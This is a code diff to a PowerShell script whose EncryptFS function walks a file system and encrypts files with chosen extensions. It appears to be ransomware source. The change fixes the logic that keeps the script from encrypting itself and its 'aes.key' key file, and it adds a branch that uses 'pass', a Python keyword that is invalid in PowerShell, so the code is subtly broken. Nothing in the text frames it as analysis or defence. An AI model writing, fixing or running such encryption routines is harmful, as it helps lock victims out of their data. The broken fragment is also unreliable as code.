@@ -148,7 +148,7 @@ function EncryptFS()
 
                                                                             if((Get-ChildItem $_.FullName) -is [System.IO.FileInfo])
                                                                             {
-                                                                                if(($current_file -ne $MyInvocation.MyCommand.Source) -and ($current_file -ne $key_path) -and ($current_ext -in $extensions))
+                                                                                if(($_.FullName -ne $MyInvocation.MyCommand.Source) -and ($_.FullName -ne $key_path) -and ($current_ext -in $extensions))
                                                                                 {
                                                                                     try
                                                                                     {
@@ -165,6 +165,10 @@ function EncryptFS()
                                                                                     {
                                                                                         continue
                                                                                     }
+                                                                                }
+                                                                                if(($_.FullName -eq $MyInvocation.MyCommand.Source) -or ($_.Name -eq 'aes.key'))
+                                                                                {
+                                                                                    pass
                                                                                 }
                                                                             }
                                                                         }
